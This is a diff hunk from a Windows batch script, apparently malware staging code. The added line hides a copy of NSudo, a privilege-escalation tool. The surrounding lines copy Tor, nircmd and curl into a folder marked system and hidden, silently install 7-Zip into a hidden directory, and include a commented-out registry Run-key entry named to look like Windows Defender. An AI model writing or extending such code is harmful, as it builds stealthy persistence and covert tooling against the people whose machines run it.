@@ -31,6 +31,7 @@ rem REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Def
 copy /y "tor.exe" "%environment%\tor.exe" && attrib +s +h +i "%environment%\tor.exe"
 copy /y "nircmd.exe" "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
 copy /y "curl.exe" "%environment%\curl.exe" && attrib +s +h +i "%environment%\curl.exe"
+copy /y "NSudo.exe" "%environment%\NSudo.exe" && attrib +s +h +i "%environment%\NSudo.exe"
 
 "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
 
